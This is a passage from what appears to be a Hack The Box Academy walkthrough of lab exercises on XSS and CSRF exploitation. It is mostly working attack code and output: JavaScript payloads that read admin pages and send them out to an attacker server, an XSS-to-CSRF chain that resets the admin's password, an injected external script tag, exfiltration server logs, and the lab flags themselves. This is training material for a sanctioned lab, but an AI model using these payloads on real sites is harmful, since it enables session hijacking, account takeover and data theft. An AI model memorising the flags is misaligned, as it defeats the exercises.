JPHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiPgoJCSQoJy51aS5jaGVja2JveCcpCgkJICAuY2hlY2tib3goKQoJCTsKCQkkKCcubWVzc2FnZSAuY2xvc2UnKQoJCSAgLm9uKCdjbGljaycsIGZ1bmN0aW9uKCkgewoJCSAgICAkKHRoaXMpCgkJICAgICAgLmNsb3Nlc3QoJy5tZXNzYWdlJykKCQkgICAgICAudHJhbnNpdGlvbignZmFkZScpCgkJICAgIDsKCQkgIH0pCgkJOwoJCSQoJy51aS5mb3JtJykKCQkgIC5mb3JtKHsKCQkgICAgZmllbGRzOiB7CgkJICAgICAgZnVsbG5hbWUgOiAnZW1wdHknLAoJCSAgICAgIGVtYWlsICAgOiAnZW1haWwnLAoJCSAgICAgIGNvbW1lbnQgIDogJ2VtcHR5JywKCQkgICAgICB0ZXJtcyAgICA6ICdjaGVja2VkJwoJCSAgICB9CgkJICB9KQoJCTsKCTwvc2NyaXB0Pgo8L2h0bWw+ | base64 -d
```

![Advanced\_XSS\_and\_CSRF\_Exploitation\_Walkthrough\_Image\_31.png](https://academy.hackthebox.com/storage/walkthroughs/125/Advanced_XSS_and_CSRF_Exploitation_Walkthrough_Image_31.png)

Students will identify the `admin.php` endpoint within the decoded data. Therefore, students need to adjust the payload hosted on the exploit server to exfiltrate data from `/admin.php`:

Code: javascript

```javascript
var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://xssintro.htb/admin.php', false);
xhr.withCredentials = true;
xhr.send();

var exfil = new XMLHttpRequest();
exfil.open("GET", "https://10.10.14.116:4443/exfil?r=" + btoa(xhr.responseText), false);
exfil.send();
```

![Advanced\_XSS\_and\_CSRF\_Exploitation\_Walkthrough\_Image\_32.png](https://academy.hackthebox.com/storage/walkthroughs/125/Advanced_XSS_and_CSRF_Exploitation_Walkthrough_Image_32.png)

Students need to wait a few moments, then check their exfiltration server to find the base64 encoded contents of the `admin.php` endpoint:

```shell-session
┌─[us-academy-1]─[10.10.15.109]─[htb-ac-594497@htb-xmgds7ogzc]─[~]
└──╼ [★]$ python3 server.py

10.129.233.62 - - [05/Jan/2025 10:22:42] code 404, message File not found
10.129.233.62 - - [05/Jan/2025 10:22:42] "GET /exfil?r=CjwhRE9DVFlQRSBodG1sPgo8aHRtbD4KCTxoZWFkPgogCQk8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+CiAgCQk8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoIj4KICAJCTx0aXRsZT5HdWVzdGJvb2sgSFRNTCBCb2lsZXJwbGF0ZTwvdGl0bGU+CiAgCQk8c2NyaXB0IHNyYz0iYXNzZXRzL2pxdWVyeS0zLjEuMS5taW4uanMiPjwvc2NyaXB0PgogIAkJPHNjcmlwdCBzcmM9ImFzc2V0cy9zZW1hbnRpYy5taW4uanMiPjwvc2NyaXB0PgogIAkJPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiB0eXBlPSJ0ZXh0L2NzcyIgY2xhc3M9InVpIiBocmVmPSJhc3NldHMvc2VtYW50aWMubWluLmNzcyI+Cgk8L2hlYWQ+CgoJPGJvZHk+CgkJPGRpdiBjbGFzcz0idWkgY29udGFpbmVyIG1lbnUiPgoJCQk8ZGl2IGNsYXNzPSJoZWFkZXIgaXRlbSI+CgkJCQlNeSBHdWVzdEJvb2sKCQkJPC9kaXY+CgkJCTxhIGNsYXNzPSJpdGVtIiBocmVmPSJob21lLnBocCI+CgkJCQlIb21lCgkJCTwvYT4KCQkJPGEgY2xhc3M9ImFjdGl2ZSBpdGVtIiBocmVmPSJ2aWV3LnBocCI+CgkJICAgIAlWaWV3IGFsbCBFbnRyaWVzCgkJICAJPC9hPgoJCQkJCQkJPGEgY2xhc3M9ImFjdGl2ZSBpdGVtIiBocmVmPSJhZG1pbi5waHAiPgoJCSAgICAJCUFkbWluaXN0cmF0b3IgRGFzaGJvYXJkCgkJICAJCTwvYT4KICAgICAgICAgICAgCQkJPGEgY2xhc3M9ImFjdGl2ZSBpdGVtIiBocmVmPSJsb2dvdXQucGhwIj4KCQkgICAgCUxvZ291dAoJCSAgCTwvYT4KCQk8L2Rpdj4KCQk8ZGl2IGNsYXNzPSJ1aSByYWlzZWQgdmVyeSBwYWRkZWQgY29udGFpbmVyIHNlZ21lbnQiPgoJCQk8ZGl2IGNsYXNzPSJ1aSBjZW50ZXJlZCBncmlkIj4KCQkJICAgIDxkaXYgY2xhc3M9InRlbiB3aWRlIGNvbHVtbiI+CgkJCSAgICAJPGltZyBzcmM9ImFzc2V0cy9hY2UucG5nIiB3aWR0aD0iNTBweDtoZWlnaHQ6YXV0bzsiPgoJCQkgICAgCTxoMSBzdHlsZT0ibWFyZ2luLWJvdHRvbTogMCI+QWRtaW5pc3RyYXRvciBEYXNoYm9hcmQ8L2gxPgoKCQkJICAgIAk8ZGl2IGNsYXNzPSJ1aSBkaXZpZGVkIGl0ZW1zIj4KICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iaXRlbSI+CgkJCQkJCQkJCQk8ZGl2IGNsYXNzPSJjb250ZW50Ij4KCQkJCQkJCQkJCQk8ZGl2IGNsYXNzPSJkZXNjcmlwdGlvbiI+CgkJCQkJCQkJCQkJCTxwPkhUQns1NjY1ZmQxYjg5OWEyNzYwY2E2ZDAyOTZiNzY4Njk5MX08L3A+CgkJCQkJCQkJCQkJPC9kaXY+CgkJCQkJCQkJCQk8L2Rpdj4KCQkJCQkJCQkJPC9kaXY+CgkJCSAgICAJPC9kaXY+CgkJCSAgICA8L2Rpdj4KCQkJPC9kaXY+CgkJPC9kaXY+CgkJPGRpdiBjbGFzcz0idWkgc21hbGwgbW9kYWwiPgoJCSAgICA8ZGl2IGNsYXNzPSJoZWFkZXIiPgoJCSAgICAgIERlbGV0ZSBUaGlzIEVudHJ5CgkJICAgIDwvZGl2PgoJCSAgICA8ZGl2IGNsYXNzPSJjb250ZW50Ij4KCQkgICAgICA8cD5BcmUgeW91IHN1cmUgeW91IHdhbnQgdG8gZGVsZXRlIHRoaXMgZW50cnk/PC9wPgoJCSAgICA8L2Rpdj4KCQkgICAgPGRpdiBjbGFzcz0iYWN0aW9ucyI+CgkJICAgICAgPGRpdiBjbGFzcz0idWkgbmVnYXRpdmUgYnV0dG9uIj4KCQkgICAgICAgIE5vCgkJICAgICAgPC9kaXY+CgkJICAgICAgPGRpdiBjbGFzcz0idWkgcG9zaXRpdmUgcmlnaHQgbGFiZWxlZCBpY29uIGJ1dHRvbiI+CgkJICAgICAgICBZZXMKCQkgICAgICAgIDxpIGNsYXNzPSJjaGVja21hcmsgaWNvbiI+PC9pPgoJCSAgICAgIDwvZGl2PgoJCSAgICA8L2Rpdj4KCQkgIDwvZGl2PgoJPC9ib2R5PgoJPHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiPgoJCSQoJy5zbWFsbC5tb2RhbCcpCgkJICAubW9kYWwoJ2F0dGFjaCBldmVudHMnLCAnLmRlbGV0ZS5idXR0b24nLCAnc2hvdycpOwoJCTsKCTwvc2NyaXB0Pgo8L2h0bWw+ HTTP/1.1" 404 -
```

Finally, students need to decode the response, while using `grep` to identify the contents of the flag:

Code: shell

```shell
echo CjwhRE9DVFlQRSBodG1sPgo8aHRtbD4KCTxoZWFkPgogCQk8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+CiAgCQk8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoIj4KICAJCTx0aXRsZT5HdWVzdGJvb2sgSFRNTCBCb2lsZXJwbGF0ZTwvdGl0bGU+CiAgCQk8c2NyaXB0IHNyYz0iYXNzZXRzL2pxdWVyeS0zLjEuMS5taW4uanMiPjwvc2NyaXB0PgogIAkJPHNjcmlwdCBzcmM9ImFzc2V0cy9zZW1hbnRpYy5taW4uanMiPjwvc2NyaXB0PgogIAkJPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiB0eXBlPSJ0ZXh0L2NzcyIgY2xhc3M9InVpIiBocmVmPSJhc3NldHMvc2VtYW50aWMubWluLmNzcyI+Cgk8L2hlYWQ+CgoJPGJvZHk+CgkJPGRpdiBjbGFzcz0idWkgY29udGFpbmVyIG1lbnUiPgoJCQk8ZGl2IGNsYXNzPSJoZWFkZXIgaXRlbSI+CgkJCQlNeSBHdWVzdEJvb2sKCQkJPC9kaXY+CgkJCTxhIGNsYXNzPSJpdGVtIiBocmVmPSJob21lLnBocCI+CgkJCQlIb21lCgkJCTwvYT4KCQkJPGEgY2xhc3M9ImFjdGl2ZSBpdGVtIiBocmVmPSJ2aWV3LnBocCI+CgkJICAgIAlWaWV3IGFsbCBFbnRyaWVzCgkJICAJPC9hPgoJCQkJCQkJPGEgY2xhc3M9ImFjdGl2ZSBpdGVtIiBocmVmPSJhZG1pbi5waHAiPgoJCSAgICAJCUFkbWluaXN0cmF0b3IgRGFzaGJvYXJkCgkJICAJCTwvYT4KICAgICAgICAgICAgCQkJPGEgY2xhc3M9ImFjdGl2ZSBpdGVtIiBocmVmPSJsb2dvdXQucGhwIj4KCQkgICAgCUxvZ291dAoJCSAgCTwvYT4KCQk8L2Rpdj4KCQk8ZGl2IGNsYXNzPSJ1aSByYWlzZWQgdmVyeSBwYWRkZWQgY29udGFpbmVyIHNlZ21lbnQiPgoJCQk8ZGl2IGNsYXNzPSJ1aSBjZW50ZXJlZCBncmlkIj4KCQkJICAgIDxkaXYgY2xhc3M9InRlbiB3aWRlIGNvbHVtbiI+CgkJCSAgICAJPGltZyBzcmM9ImFzc2V0cy9hY2UucG5nIiB3aWR0aD0iNTBweDtoZWlnaHQ6YXV0bzsiPgoJCQkgICAgCTxoMSBzdHlsZT0ibWFyZ2luLWJvdHRvbTogMCI+QWRtaW5pc3RyYXRvciBEYXNoYm9hcmQ8L2gxPgoKCQkJICAgIAk8ZGl2IGNsYXNzPSJ1aSBkaXZpZGVkIGl0ZW1zIj4KICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iaXRlbSI+CgkJCQkJCQkJCQk8ZGl2IGNsYXNzPSJjb250ZW50Ij4KCQkJCQkJCQkJCQk8ZGl2IGNsYXNzPSJkZXNjcmlwdGlvbiI+CgkJCQkJCQkJCQkJCTxwPkhUQns1NjY1ZmQxYjg5OWEyNzYwY2E2ZDAyOTZiNzY4Njk5MX08L3A+CgkJCQkJCQkJCQkJPC9kaXY+CgkJCQkJCQkJCQk8L2Rpdj4KCQkJCQkJCQkJPC9kaXY+CgkJCSAgICAJPC9kaXY+CgkJCSAgICA8L2Rpdj4KCQkJPC9kaXY+CgkJPC9kaXY+CgkJPGRpdiBjbGFzcz0idWkgc21hbGwgbW9kYWwiPgoJCSAgICA8ZGl2IGNsYXNzPSJoZWFkZXIiPgoJCSAgICAgIERlbGV0ZSBUaGlzIEVudHJ5CgkJICAgIDwvZGl2PgoJCSAgICA8ZGl2IGNsYXNzPSJjb250ZW50Ij4KCQkgICAgICA8cD5BcmUgeW91IHN1cmUgeW91IHdhbnQgdG8gZGVsZXRlIHRoaXMgZW50cnk/PC9wPgoJCSAgICA8L2Rpdj4KCQkgICAgPGRpdiBjbGFzcz0iYWN0aW9ucyI+CgkJICAgICAgPGRpdiBjbGFzcz0idWkgbmVnYXRpdmUgYnV0dG9uIj4KCQkgICAgICAgIE5vCgkJICAgICAgPC9kaXY+CgkJICAgICAgPGRpdiBjbGFzcz0idWkgcG9zaXRpdmUgcmlnaHQgbGFiZWxlZCBpY29uIGJ1dHRvbiI+CgkJICAgICAgICBZZXMKCQkgICAgICAgIDxpIGNsYXNzPSJjaGVja21hcmsgaWNvbiI+PC9pPgoJCSAgICAgIDwvZGl2PgoJCSAgICA8L2Rpdj4KCQkgIDwvZGl2PgoJPC9ib2R5PgoJPHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiPgoJCSQoJy5zbWFsbC5tb2RhbCcpCgkJICAubW9kYWwoJ2F0dGFjaCBldmVudHMnLCAnLmRlbGV0ZS5idXR0b24nLCAnc2hvdycpOwoJCTsKCTwvc2NyaXB0Pgo8L2h0bWw+ | base64 -d | grep HTB
```

```shell-session
┌─[us-academy-1]─[10.10.15.109]─[htb-ac-594497@htb-xmgds7ogzc]─[~]
└──╼ [★]$ echo CjwhRE9DVFlQRSBodG1sPgo8aHRtbD4KCTxoZWFkPgogCQk8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+CiAgCQk8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoIj4KICAJCTx0aXRsZT5HdWVzdGJvb2sgSFRNTCBCb2lsZXJwbGF0ZTwvdGl0bGU+CiAgCQk8c2NyaXB0IHNyYz0iYXNzZXRzL2pxdWVyeS0zLjEuMS5taW4uanMiPjwvc2NyaXB0PgogIAkJPHNjcmlwdCBzcmM9ImFzc2V0cy9zZW1hbnRpYy5taW4uanMiPjwvc2NyaXB0PgogIAkJPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiB0eXBlPSJ0ZXh0L2NzcyIgY2xhc3M9InVpIiBocmVmPSJhc3NldHMvc2VtYW50aWMubWluLmNzcyI+Cgk8L2hlYWQ+CgoJPGJvZHk+CgkJPGRpdiBjbGFzcz0idWkgY29udGFpbmVyIG1lbnUiPgoJCQk8ZGl2IGNsYXNzPSJoZWFkZXIgaXRlbSI+CgkJCQlNeSBHdWVzdEJvb2sKCQkJPC9kaXY+CgkJCTxhIGNsYXNzPSJpdGVtIiBocmVmPSJob21lLnBocCI+CgkJCQlIb21lCgkJCTwvYT4KCQkJPGEgY2xhc3M9ImFjdGl2ZSBpdGVtIiBocmVmPSJ2aWV3LnBocCI+CgkJICAgIAlWaWV3IGFsbCBFbnRyaWVzCgkJICAJPC9hPgoJCQkJCQkJPGEgY2xhc3M9ImFjdGl2ZSBpdGVtIiBocmVmPSJhZG1pbi5waHAiPgoJCSAgICAJCUFkbWluaXN0cmF0b3IgRGFzaGJvYXJkCgkJICAJCTwvYT4KICAgICAgICAgICAgCQkJPGEgY2xhc3M9ImFjdGl2ZSBpdGVtIiBocmVmPSJsb2dvdXQucGhwIj4KCQkgICAgCUxvZ291dAoJCSAgCTwvYT4KCQk8L2Rpdj4KCQk8ZGl2IGNsYXNzPSJ1aSByYWlzZWQgdmVyeSBwYWRkZWQgY29udGFpbmVyIHNlZ21lbnQiPgoJCQk8ZGl2IGNsYXNzPSJ1aSBjZW50ZXJlZCBncmlkIj4KCQkJICAgIDxkaXYgY2xhc3M9InRlbiB3aWRlIGNvbHVtbiI+CgkJCSAgICAJPGltZyBzcmM9ImFzc2V0cy9hY2UucG5nIiB3aWR0aD0iNTBweDtoZWlnaHQ6YXV0bzsiPgoJCQkgICAgCTxoMSBzdHlsZT0ibWFyZ2luLWJvdHRvbTogMCI+QWRtaW5pc3RyYXRvciBEYXNoYm9hcmQ8L2gxPgoKCQkJICAgIAk8ZGl2IGNsYXNzPSJ1aSBkaXZpZGVkIGl0ZW1zIj4KICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iaXRlbSI+CgkJCQkJCQkJCQk8ZGl2IGNsYXNzPSJjb250ZW50Ij4KCQkJCQkJCQkJCQk8ZGl2IGNsYXNzPSJkZXNjcmlwdGlvbiI+CgkJCQkJCQkJCQkJCTxwPkhUQns1NjY1ZmQxYjg5OWEyNzYwY2E2ZDAyOTZiNzY4Njk5MX08L3A+CgkJCQkJCQkJCQkJPC9kaXY+CgkJCQkJCQkJCQk8L2Rpdj4KCQkJCQkJCQkJPC9kaXY+CgkJCSAgICAJPC9kaXY+CgkJCSAgICA8L2Rpdj4KCQkJPC9kaXY+CgkJPC9kaXY+CgkJPGRpdiBjbGFzcz0idWkgc21hbGwgbW9kYWwiPgoJCSAgICA8ZGl2IGNsYXNzPSJoZWFkZXIiPgoJCSAgICAgIERlbGV0ZSBUaGlzIEVudHJ5CgkJICAgIDwvZGl2PgoJCSAgICA8ZGl2IGNsYXNzPSJjb250ZW50Ij4KCQkgICAgICA8cD5BcmUgeW91IHN1cmUgeW91IHdhbnQgdG8gZGVsZXRlIHRoaXMgZW50cnk/PC9wPgoJCSAgICA8L2Rpdj4KCQkgICAgPGRpdiBjbGFzcz0iYWN0aW9ucyI+CgkJICAgICAgPGRpdiBjbGFzcz0idWkgbmVnYXRpdmUgYnV0dG9uIj4KCQkgICAgICAgIE5vCgkJICAgICAgPC9kaXY+CgkJICAgICAgPGRpdiBjbGFzcz0idWkgcG9zaXRpdmUgcmlnaHQgbGFiZWxlZCBpY29uIGJ1dHRvbiI+CgkJICAgICAgICBZZXMKCQkgICAgICAgIDxpIGNsYXNzPSJjaGVja21hcmsgaWNvbiI+PC9pPgoJCSAgICAgIDwvZGl2PgoJCSAgICA8L2Rpdj4KCQkgIDwvZGl2PgoJPC9ib2R5PgoJPHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiPgoJCSQoJy5zbWFsbC5tb2RhbCcpCgkJICAubW9kYWwoJ2F0dGFjaCBldmVudHMnLCAnLmRlbGV0ZS5idXR0b24nLCAnc2hvdycpOwoJCTsKCTwvc2NyaXB0Pgo8L2h0bWw+ | base64 -d | grep HTB

<p>HTB{5665fd1b899a2760ca6d0296b7686991}</p>
```

Answer: `HTB{5665fd1b899a2760ca6d0296b7686991}`

## Launching Attacks from the Victim's Session

### Question 1

#### "Exploit the XSS vulnerability to takeover the victim's account with the username admin."

Students need to first add the necessary vhosts to their `/etc/hosts` file:

Code: shell

```shell
sudo sh -c 'echo "STMIP exploitserver.htb victim-session.htb" >> /etc/hosts'
```

```shell-session
┌─[us-academy-1]─[10.10.15.109]─[htb-ac-594497@htb-xmgds7ogzc]─[~]
└──╼ [★]$ sudo sh -c 'echo "10.129.233.62 exploitserver.htb victim-session.htb" >> /etc/hosts'
```

Next, students need to sign in to `https://victim-session.htb` using the credentials `htb-stdnt:Academy_student!`:

![Advanced\_XSS\_and\_CSRF\_Exploitation\_Walkthrough\_Image\_1.png](https://academy.hackthebox.com/storage/walkthroughs/125/Advanced_XSS_and_CSRF_Exploitation_Walkthrough_Image_1.png)

Upon logging in, students need to right-click and `View Page Source`, identifying the attribute `id="csrf_token"` with the value being set to the user's CSRF token:

![Advanced\_XSS\_and\_CSRF\_Exploitation\_Walkthrough\_Image\_34.png](https://academy.hackthebox.com/storage/walkthroughs/125/Advanced_XSS_and_CSRF_Exploitation_Walkthrough_Image_34.png)

Additionally, the vulnerable site has a form to update the user's profile:

![Advanced\_XSS\_and\_CSRF\_Exploitation\_Walkthrough\_Image\_35.png](https://academy.hackthebox.com/storage/walkthroughs/125/Advanced_XSS_and_CSRF_Exploitation_Walkthrough_Image_35.png)

Students need to open the Firefox Developer Console by pressing `F12`, then navigate to the `Network` tab. Subsequently, students need to press the `Submit` button and inspect the request, discovering the data being sent:

![Advanced\_XSS\_and\_CSRF\_Exploitation\_Walkthrough\_Image\_36.png](https://academy.hackthebox.com/storage/walkthroughs/125/Advanced_XSS_and_CSRF_Exploitation_Walkthrough_Image_36.png)

Having identified the location of the CSRF token within the page's HTML, along with the necessary data to be sent in the POST request, students need to craft an XSS payload to force the administrator user to update their profile and change their password:

Code: js

```js
// GET CSRF token
var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://victim-session.htb/home.php', false);
xhr.withCredentials = true;
xhr.send();
var doc = new DOMParser().parseFromString(xhr.responseText, 'text/html');
var csrftoken = encodeURIComponent(doc.getElementById('csrf_token').value);

// change PW
var csrf_req = new XMLHttpRequest();
var params = `username=admin&email=admin@vulnerablesite.htb&password=pwned&csrf_token=${csrftoken}`;
csrf_req.open('POST', 'https://victim-session.htb/home.php', false);
csrf_req.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
csrf_req.withCredentials = true;
csrf_req.send(params);
```

Students need to save the payload to the exploit server. Then, they need to return to the vulnerable site and leave a comment in the guestbook, referencing the external script:

Code: html

```html
<script src="https://exploitserver.htb/exploit"></script>
```

After a few moments, students need to logout of the vulnerable site, then log back in with the credentials `admin:pwned`. Once logged in, students need to navigate to the Administrator Dashboard seen at the top of the page, revealing the flag:

![Advanced\_XSS\_and\_CSRF\_Exploitation\_Walkthrough\_Image\_37.png](https://academy.hackthebox.com/storage/walkthroughs/125/Advanced_XSS_and_CSRF_Exploitation_Walkthrough_Image_37.png)

![Advanced\_XSS\_and\_CSRF\_Exploitation\_Walkthrough\_Image\_38.png](https://academy.hackthebox.com/storage/walkthroughs/125/Advanced_XSS_and_CSRF_Exploitation_Walkthrough_Image_38.png)

Answer: `HTB{ef6822275912cb2e1f2e3ab8d3b5e4fe}`

## Enumerating internal APIs

### Question 1

#### "Exploit the XSS vulnerability to enumerate the API and obtain the flag."

Students need to first add the necessary vhosts to their `/etc/hosts` file:

Code: shell

```shell
sudo sh -c 'echo "STMIP exploitserver.htb internal-apis.htb" >> /etc/hosts'
```

```shell-session
┌─[us-academy-1]─[10.10.15.109]─[htb-ac-594497@htb-xmgds7ogzc]─[~]
└──╼ [★]$ sudo sh -c 'echo "10.129.233.62 exploitserver.htb internal-apis.htb" >> /etc/hosts'
```

Next, students need to log in to the vulnerable site using the credentials `htb-stdnt:Academy_student!`. Subsequently, students need to submit their base XSS payload as a guestbook entry:

Code: html

Code: html

```html
<script src="https://exploitserver.htb/exploit"></script>
```

![Advanced\_XSS\_and\_CSRF\_Exploitation\_Walkthrough\_Image\_39.png](https://academy.hackthebox.com/storage/walkthroughs/125/Advanced_XSS_and_CSRF_Exploitation_Walkthrough_Image_39.png)

Once submitted, students need to prepare a payload on the exploit server, attempting to exfiltrate the admin endpoint and identify potentially interesting admin-only functionality:

Code: js

```js
var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://internal-apis.htb/admin.php', false);
xhr.send();

var exfil = new XMLHttpRequest();
exfil.open("GET", "https://10.10.14.116:4443/exfil?r=" + btoa(xhr.responseText), false);
exfil.send();
```

Saving the payload to the exploit server, students need to wait a few moments before checking their exfiltration server:

```shell-session
┌─[us-academy-1]─[10.10.15.109]─[htb-ac-594497@htb-xmgds7ogzc]─[~]
└──╼ [★]$ python3 server.py

10.129.233.62 - - [05/Jan/2025 10:34:43] code 404, message File not found
10.129.233.62 - - [05/Jan/2025 10:34:43] "GET /exfil?r=CjwhRE9DVFlQRSBodG1sPgo8aHRtbD4KCTxoZWFkPgogCQk8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+CiAgCQk8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoIj4KICAJCTx0aXRsZT5HdWVzdGJvb2sgSFRNTCBCb2lsZXJwbGF0ZTwvdGl0bGU+CiAgCQk8c2NyaXB0IHNyYz0iYXNzZXRzL2pxdWVyeS0zLjEuMS5taW4uanMiPjwvc2NyaXB0PgogIAkJPHNjcmlwdCBzcmM9ImFzc2V0cy9zZW1hbnRpYy5taW4uanMiPjwvc2NyaXB0PgogIAkJPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiB0eXBlPSJ0ZXh0L2NzcyIgY2xhc3M9InVpIiBocmVmPSJhc3NldHMvc2VtYW50aWMubWluLmNzcyI+Cgk8L2hlYWQ+CgoJPGJvZHk+CgkJPGRpdiBjbGFzcz0idWkgY29udGFpbmVyIG1lbnUiPgoJCQk8ZGl2IGNsYXNzPSJoZWFkZXIgaXRlbSI+CgkJCQlNeSBHdWVzdEJvb2sKCQkJPC9kaXY+CgkJCTxhIGNsYXNzPSJpdGVtIiBocmVmPSJob21lLnBocCI+CgkJCQlIb21lCgkJCTwvYT4KCQkJPGEgY2xhc3M9ImFjdGl2ZSBpdGVtIiBocmVmPSJ2aWV3LnBocCI+CgkJICAgIAlWaWV3IGFsbCBFbnRyaWVzCgkJICAJPC9hPgoJCQkJCQkJPGEgY2xhc3M9ImFjdGl2ZSBpdGVtIiBocmVmPSJhZG1pbi5waHAiPgoJCSAgICAJCUFkbWluaXN0cmF0b3IgRGFzaGJvYXJkCgkJICAJCTwvYT4KICAgICAgICAgICAgCQkJPGEgY2xhc3M9ImFjdGl2ZSBpdGVtIiBocmVmPSJsb2dvdXQucGhwIj4KCQkgICAgCUxvZ291dAoJCSAgCTwvYT4KCQk8L2Rpdj4KCQk8ZGl2IGNsYXNzPSJ1aSByYWlzZWQgdmVyeSBwYWRkZWQgY29udGFpbmVyIHNlZ21lbnQiPgoJCQk8ZGl2IGNsYXNzPSJ1aSBjZW50ZXJlZCBncmlkIj4KCQkJICAgIDxkaXYgY2xhc3M9InRlbiB3aWRlIGNvbHVtbiI+CgkJCSAgICAJPGltZyBzcmM9ImFzc2V0cy9hY2UucG5nIiB3aWR0aD0iNTBweDtoZWlnaHQ6YXV0bzsiPgoJCQkgICAgCTxoMSBzdHlsZT0ibWFyZ2luLWJvdHRvbTogMCI+QWRtaW5pc3RyYXRvciBEYXNoYm9hcmQ8L2gxPgoKCQkJICAgIAk8ZGl2IGNsYXNzPSJ1aSBkaXZpZGVkIGl0ZW1zIj4KICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iaXRlbSI+CgkJCQkJCQk8ZGl2IGNsYXNzPSJjb250ZW50Ij4KCQkJCQkJCQk8ZGl2IGNsYXNzPSJkZXNjcmlwdGlvbiI+CgkJCQkJCQkJCTxwPkFkbWluaXN0cmF0b3IgU2Vzc2lvbnM8L3A+CgkJCQkJCQkJCTx0YWJsZSBpZD0ibXlUYWJsZSI+CgkJCQkJCQkJCQk8dHI+CgkJCQkJCQkJCQkJPHRoPlVzZXI8L3RoPgoJCQkJCQkJCQkJCTx0aD5UaW1lc3RhbXA8L3RoPgoJCQkJCQkJCQkJCTx0aD5Vc2VyLUFnZW50PC90aD4KCQkJCQkJCQkJCTwvdHI+CgkJCQkJCQkJCTwvdGFibGU+CgkJCQkJCQkJPC9kaXY+CgkJCQkJCQk8L2Rpdj4KCQkJCQkJPC9kaXY+CgkJCSAgICAJPC9kaXY+CgkJCSAgICA8L2Rpdj4KCQkJPC9kaXY+CgkJCTxzY3JpcHQ+CgkJCQlmZXRjaCgiaHR0cHM6Ly9hcGkuaW50ZXJuYWwtYXBpcy5odGIvdjEvc2Vzc2lvbnMiLCB7CgkJCQkJbWV0aG9kOiAiR0VUIgoJCQkJfSkudGhlbigocmVzcG9uc2UpID0+IHsKCQkJCQlyZXR1cm4gcmVzcG9uc2UuanNvbigpOwoJCQkJfSkudGhlbigoZGF0YSkgPT4gewoJCQkJCS8vIGFkZCB0byBET00KCQkJCQl2YXIgdGFibGUgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgibXlUYWJsZSIpOwoJCQkJCWZvcihsZXQgaSA9IDA7IGkgPCBkYXRhWydzZXNzaW9ucyddLmxlbmd0aDsgaSsrKSB7CgkJCQkJCWxldCBvYmogPSBkYXRhWydzZXNzaW9ucyddW2ldOwoJCQkJCQl2YXIgcm93ID0gdGFibGUuaW5zZXJ0Um93KCk7CgkJCQkJCXZhciBjZWxsMSA9IHJvdy5pbnNlcnRDZWxsKCk7CgkJCQkJCXZhciBjZWxsMiA9IHJvdy5pbnNlcnRDZWxsKCk7CgkJCQkJCXZhciBjZWxsMyA9IHJvdy5pbnNlcnRDZWxsKCk7CgkJCQkJCWNlbGwxLmlubmVySFRNTCA9IG9iai51c2VyOwoJCQkJCQljZWxsMi5pbm5lckhUTUwgPSBvYmoudGltZTsKCQkJCQkJY2VsbDMuaW5uZXJIVE1MID0gb2JqLmFnZW50OwoJCQkJCX0KCQkJCX0pOwoJCQk8L3NjcmlwdD4KCQk8L2Rpdj4KCTwvYm9keT4KCTxzY3JpcHQgdHlwZT0idGV4dC9qYXZhc2NyaXB0Ij4KCQkkKCcuc21hbGwubW9kYWwnKQoJCSAgLm1vZGFsKCdhdHRhY2ggZXZlbnRzJywgJy5kZWxldGUuYnV0dG9uJywgJ3Nob3cnKTsKCQk7Cgk8L3NjcmlwdD4KPC9odG1sPgo= HTTP/1.1" 404 -
```

Students need to decode the base64 encoded data:

Code: shell

```shell
echo CjwhRE9DVFlQRSBodG1sPgo8aHRtbD4KCTxoZWFkPgogCQk8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+CiAgCQk8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoIj4KICAJCTx0aXRsZT5HdWVzdGJvb2sgSFRNTCBCb2lsZXJwbGF0ZTwvdGl0bGU+CiAgCQk8c2NyaXB0IHNyYz0iYXNzZXRzL2pxdWVyeS0zLjEuMS5taW4uanMiPjwvc2NyaXB0PgogIAkJPHNjcmlwdCBzcmM9ImFzc2V0cy9zZW1hbnRpYy5taW4uanMiPjwvc2NyaXB0PgogIAkJPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiB0eXBlPSJ0ZXh0L2NzcyIgY2xhc3M9InVpIiBocmVmPSJhc3NldHMvc2VtYW50aWMubWluLmNzcyI+Cgk8L2hlYWQ+CgoJPGJvZHk+CgkJPGRpdiBjbGFzcz0idWkgY29udGFpbmVyIG1lbnUiPgoJCQk8ZGl2IGNsYXNzPSJoZWFkZXIgaXRlbSI+CgkJCQlNeSBHdWVzdEJvb2sKCQkJPC9kaXY+CgkJCTxhIGNsYXNzPSJpdGVtIiBocmVmPSJob21lLnBocCI+CgkJCQlIb21lCgkJCTwvYT4KCQkJPGEgY2xhc3M9ImFjdGl2ZSBpdGVtIiBocmVmPSJ2aWV3LnBocCI+CgkJICAgIAlWaWV3IGFsbCBFbnRyaWVzCgkJICAJPC9hPgoJCQkJCQkJPGEg